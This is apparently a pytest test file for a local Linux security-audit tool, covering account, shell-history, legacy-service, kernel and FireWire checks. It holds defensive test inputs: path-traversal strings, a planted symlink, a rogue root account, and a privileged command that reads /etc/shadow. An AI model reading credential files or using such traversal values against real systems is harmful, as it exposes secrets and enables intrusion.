    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    put(d / "arch-audit.json", json.dumps({"at": "2026-01-01", "time": "09:00", "attempted": "2026-01-05"}), 0o600)
    s = {x["id"]: x for x in v.source_status()}["arch-audit"]
    assert s["state"] == "failed" and s["date"] == "2026-01-01" and s["tried"] == "2026-01-05"
    put(d / "arch-audit.json", json.dumps({"at": "2026-01-01", "time": "09:00", "attempted": "2026-01-01"}), 0o600)
    assert {x["id"]: x for x in v.source_status()}["arch-audit"]["state"] == "stale"


def test_last_run_recorded_for_source_updates(v):
    assert v.last_run() == {"at": "", "ok": False}
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.refresh_due_feeds(sources_only=True)                                # arch-audit fails: no output
    r = v.last_run()
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}", r["at"]) and r["ok"] is False
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.refresh_due_feeds(sources_only=True)
    assert v.last_run()["ok"] is True


def test_warnings_cost_less_than_failures(v):
    warn = v.result("a", "harden", "A", "warn", "x", weight=3)
    fail = v.result("b", "harden", "B", "fail", "x", weight=3)
    assert v.score_of([warn]) == 94 and v.score_of([fail]) == 70


# --------------------------------------------------------------------------
# Accounts, shell history and old network services (Vigil's own; Lynis is retired)

PASSWD = """root:x:0:0::/root:/usr/bin/bash
bin:x:1:1::/:/usr/bin/nologin
marc:x:1000:1000::/home/marc:/usr/bin/bash
"""


def test_accounts_clean(v):
    sysfile(v, "/etc/passwd", PASSWD)
    c = v.check_accounts()
    assert c["status"] == "pass" and "A Full scan also checks" in c["summary"]
    put(Path(v.HOME, ".local/state/omarchy-vigil/no-password.txt"), "", 0o600)
    assert v.check_accounts()["summary"] == "No extra root accounts, shared IDs or accounts without a password."


def test_accounts_findings(v):
    sysfile(v, "/etc/passwd", PASSWD + "toor:x:0:0::/root:/usr/bin/bash\ntwin:x:1000:1000::/home/t:/bin/sh\n")
    put(Path(v.HOME, ".local/state/omarchy-vigil/no-password.txt"), "marc\nnot-a-user\n../../x\n", 0o600)
    c = v.check_accounts()
    assert c["status"] == "fail"
    assert c["summary"] == ("Another account has root's powers, 1 account has no password and some accounts "
                            "share one ID.")
    assert "Root powers: toor" in c["detail"] and "No password: marc" in c["detail"]
    assert "Same ID: marc, twin" in c["detail"] and "not-a-user" not in c["detail"]
    assert "sudo passwd -l" in c["howto"]
    sysfile(v, "/etc/passwd", PASSWD + "twin:x:1000:1000::/home/t:/bin/sh\n")
    put(Path(v.HOME, ".local/state/omarchy-vigil/no-password.txt"), "", 0o600)
    assert v.check_accounts()["status"] == "warn"


def test_accounts_password_list_must_be_ours(v, tmp_path):
    sysfile(v, "/etc/passwd", PASSWD)
    planted = put(tmp_path / "planted", "marc\n")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    os.symlink(planted, d / "no-password.txt")
    assert v.no_password_scan() == ("", None)
    assert v.check_accounts()["status"] == "pass"


def test_shell_history(v):
    assert v.check_shell_history()["status"] == "pass"
    put(Path(v.HOME, ".bash_history"), "ls\n")
    assert v.check_shell_history()["status"] == "pass"
    os.symlink("/dev/null", Path(v.HOME, ".zsh_history"))
    c = v.check_shell_history()
    assert c["status"] == "warn" and "~/.zsh_history is a link" in c["detail"] and c["howto"]


def test_old_services(v):
    assert v.check_old_services()["status"] == "pass"
    v.UNITS[("is-enabled", "telnet.socket")] = "enabled"
    v.UNITS[("is-active", "tftpd.service")] = "active"
    c = v.check_old_services()
    assert c["status"] == "warn" and c["summary"] == "telnet.socket and tftpd.service switched on."
    assert c["fix"] == {"kind": "terminal", "action": "old-services-off", "label": "Switch them off"}


def test_old_services_list_matches_the_switch_off_script(v):
    m = re.search(r"var OLD_SERVICES = \[(.*?)\]", (REPO / "Model.js").read_text(), re.S)
    assert tuple(re.findall(r'"([a-z.-]+)"', m.group(1))) == v.OLD_SERVICES


def test_restart_needed(v, monkeypatch):
    monkeypatch.setattr(v, "_running_kernel", lambda: "6.18.44-arch1-1")
    assert v.check_restart()["status"] == "na"
    Path(v.sys_path("/usr/lib/modules/6.18.44-arch1-1")).mkdir(parents=True)
    assert v.check_restart()["status"] == "pass"
    monkeypatch.setattr(v, "_running_kernel", lambda: "6.18.40-arch1-1")
    c = v.check_restart()
    assert c["status"] == "warn" and c["fix"]["action"] == "restart"
    monkeypatch.setattr(v, "_running_kernel", lambda: "../../etc")
    assert v.check_restart()["status"] == "na"


# --------------------------------------------------------------------------
# Rarely used protocols and FireWire (Vigil's answers to Lynis NETW-3200 and STRG-1846)

def test_rare_protocols_only_shown_to_undo_an_earlier_change(v):
    assert v.check_rare_protocols() is None
    assert "rare-protocols" not in [c["id"] for c in v.audit(peek=True)["checks"]]
    sysfile(v, "/etc/modprobe.d/90-omarchy-vigil-protocols.conf", v.ETC_MARK + "\ninstall dccp /bin/false\n")
    c = {c["id"]: c for c in v.audit(peek=True)["checks"]}["rare-protocols"]
    assert c["status"] == "pass" and c["undo"]["action"] == "undo-protocols"


def test_firewire_only_matters_with_a_port(v):
    assert v.check_firewire()["summary"] == "This machine has no FireWire port."
    sysfile(v, "/sys/bus/pci/devices/0000:00:1f.0/class", "0x060100\n")
    sysfile(v, "/sys/bus/pci/devices/0000:03:00.0/class", "0x0c0010\n")
    c = v.check_firewire()
    assert c["status"] == "info" and c["fix"]["action"] == "firewire-off"
    sysfile(v, "/etc/modprobe.d/90-omarchy-vigil-firewire.conf",
            v.ETC_MARK + "\ninstall firewire-core /bin/false\n")
    assert v.check_firewire()["status"] == "pass" and v.undo_available("undo-firewire")


# --------------------------------------------------------------------------
# Full scan: the whole home folder, Bumblebee, and the next automatic update

def bumblebee_install(v, mode=0o755):
    base = Path(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID)
    script = put(base / "bin" / "scan_bumblebee.py", "print('{}')\n", mode)
    v.TRUSTED.add(v.ROOT + "/usr/bin/python3")
    return str(script)


def test_full_scan_asks_bumblebee_to_rescan(v):
    script = bumblebee_install(v)
    v.COMMANDS[("/usr/bin/python3", script, "--force")] = (0, "{}")
    res = v.refresh_due_feeds(full=True)
    assert res["message"].startswith("Had Bumblebee rescan your packages.")
    assert "Bumblebee" not in v.refresh_due_feeds(sources_only=True)["message"]


def test_bumblebee_scanner_must_be_safe_to_run(v, tmp_path):
    script = bumblebee_install(v, 0o777)                     # writable by anyone: refused
    assert v.bumblebee_scanner() == ""
    os.chmod(script, 0o755)
    assert v.bumblebee_scanner() == script
    os.unlink(script)
    os.symlink(put(tmp_path / "elsewhere.py", "x"), script)  # a link: refused
    assert v.bumblebee_scanner() == ""




def test_password_check_uses_omarchys_password_dialog(v):
    sysfile(v, "/etc/passwd", PASSWD + "ghost:x:1001:1001::/home/g:/bin/sh\n")
    v.TRUSTED |= {v.ROOT + "/usr/bin/pkexec", v.ROOT + "/usr/bin/awk"}
    assert v.NO_PASSWORD_ARGV == ["/usr/bin/pkexec", "/usr/bin/awk", "-F:", '$2 == "" { print $1 }', "/etc/shadow"]
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (0, "ghost\n../evil\n")
    res = v.refresh_due_feeds(full=True)
    assert res["message"].startswith("Checked for accounts without a password.")
    assert v.no_password_scan()[1] == ["ghost"]
    c = v.check_accounts()
    assert c["status"] == "fail" and "No password: ghost" in c["detail"]
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (126, "")                     # dialog cancelled
    res = v.refresh_due_feeds(full=True)
    assert "The password check was skipped" in res["message"] and "tries again" not in res["message"]
    assert v.no_password_scan()[1] == ["ghost"]                           # last result kept


def test_weekly_run_never_asks_for_a_password(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pkexec", v.ROOT + "/usr/bin/awk"}
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (0, "")
    v.refresh_due_feeds()
    assert v.no_password_scan() == ("", None)
